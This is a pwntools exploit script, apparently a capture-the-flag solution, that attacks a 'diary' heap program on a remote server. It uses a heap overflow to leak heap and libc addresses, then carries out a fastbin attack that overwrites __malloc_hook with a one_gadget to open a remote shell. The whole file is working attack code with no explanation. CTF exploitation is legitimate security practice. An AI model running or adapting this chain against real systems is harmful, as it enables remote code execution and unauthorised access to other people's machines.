from pwn import *

# p = process("./diary")
p = remote("114.116.54.89", "10010")
context.log_level = 'debug'


def creat(lenth):
    p.recvuntil(">\n")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(lenth))
    p.recvuntil(")")
    p.sendline("n")


def write(idx, lenth, n):
    p.recvuntil(">\n")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    # p.recvuntil(":")
    # p.sendline("1234")
    p.recvuntil(":")
    p.sendline(str(lenth))
    p.recvuntil(":")
    p.send(n)


def delete(idx):
    p.recvuntil(">\n")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))
    # p.recvuntil(":\n")
    # p.sendline("1234")


def view(idx):
    p.recvuntil(">\n")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))
    # p.recvuntil(":")
    # p.sendline("1234")


def dbg():
    print p.pid
    pause()


creat(0x10)  # 0
creat(0x10)  # 1
creat(0x10)  # 2
creat(0x10)  # 3
creat(0x10)  # 4
creat(0x10)  # 5

delete(2)
delete(4)
delete(1)
# dbg()
write(3, 0x21, p64(0)*3+p64(0x21)+'\x20')
# dbg()
creat(0x10)  # 1
creat(0x10)  # 2
creat(0x10)  # 4
# dbg()
delete(3)
delete(4)
view(1)
p.recvuntil('\n')
heap_base = u64(p.recv(6)+'\x00\x00')-0x60
info("heap base: "+hex(heap_base))
# p.interactive()

creat(0x100)  # 3
creat(0x20)
creat(0x68)  # 6
creat(0x68)  # 7
delete(3)
# dbg()
write(5, 0x30, p64(0)*3+p64(0x111)+p64(0xdeadbeef)+p64(heap_base))
creat(0x100)
# dbg()
view(0)
p.recv()
p.recvuntil('\n')
libc_base = u64(p.recv(6)+'\x00\x00')-0x3c4b78
info("libc base:"+hex(libc_base))
delete(7)
# dbg()
write(6, 0x78, p64(0)*13+p64(0x71)+p64(0x3c4aed+libc_base))
# dbg()
creat(0x68)
creat(0x68)  # 8
write(8, 0x1b, 'a'*0x13+p64(0x4526a+libc_base))
# dbg()
p.recvuntil(">\n")
p.sendline("1")
p.recvuntil(":")
p.sendline(str(1))
p.interactive()
# p.interactive()
